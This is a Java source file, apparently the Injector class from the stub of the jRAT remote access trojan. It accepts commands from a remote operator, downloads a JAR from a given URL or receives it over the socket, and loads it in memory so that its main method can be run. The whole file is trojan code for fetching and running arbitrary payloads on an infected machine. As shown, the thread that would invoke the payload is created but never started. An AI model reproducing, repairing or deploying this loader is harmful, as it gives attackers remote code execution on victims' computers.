package su.jrat.stub;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLConnection;
import java.util.jar.JarInputStream;

import su.jrat.common.io.FileIO;

public class Injector {
	
	public void inject(DataInputStream dis) throws Exception {
		String mainClass = Connection.readLine();
		boolean fromUrl = Connection.readBoolean();
		
		long size;
		
		ByteArrayOutputStream baos;
		
		if (fromUrl) {
			String url = Connection.readLine();
			URLConnection con = new URL(url).openConnection();
			InputStream in = con.getInputStream();
			
			baos = new ByteArrayOutputStream(con.getContentLength());
			
			byte[] buffer = new byte[1024];
			
			int count;
			while ((count = in.read(buffer, 0, 1024)) != -1) {
				baos.write(buffer, 0, count);
			}

			in.close();
		} else {
			int read = 0;
			int chunkSize;

			size = dis.readLong();
			
			baos = new ByteArrayOutputStream((int) size);

			while ((chunkSize = dis.readInt()) != -1) {
				byte[] chunk = new byte[chunkSize];

				read += chunkSize;

				dis.readFully(chunk);

				baos.write(chunk);
			}
		}
		
		
		ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
		
		InjectorClassloader classLoader = new InjectorClassloader(Injector.class.getClassLoader(), new JarInputStream(bais));
	
		final Class<?> classToLoad = classLoader.loadClass(mainClass);
		final Method method = classToLoad.getMethod("main", new Class[] { String[].class });
		
		new Thread(new Runnable() {
			@Override
			public void run() {
				try {
					method.invoke(classToLoad.newInstance(), new Object[] { new String[0] });
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		});
	}
	
	public static String getClassName(String fileName) {
		return fileName.substring(0, fileName.length() - 6).replace('/', '.');
	}

	public static byte[] fromInputStream(InputStream stream, int size) throws Exception {
		byte[] buffer = new byte[1024];
		int count = 0;
		
		ByteArrayOutputStream out = new ByteArrayOutputStream(size == -1 ? 1024 : size);

		while ((count = stream.read(buffer)) != -1) {
			out.write(buffer, 0, count);
		}

		out.close();
		
		return out.toByteArray();
	}
}
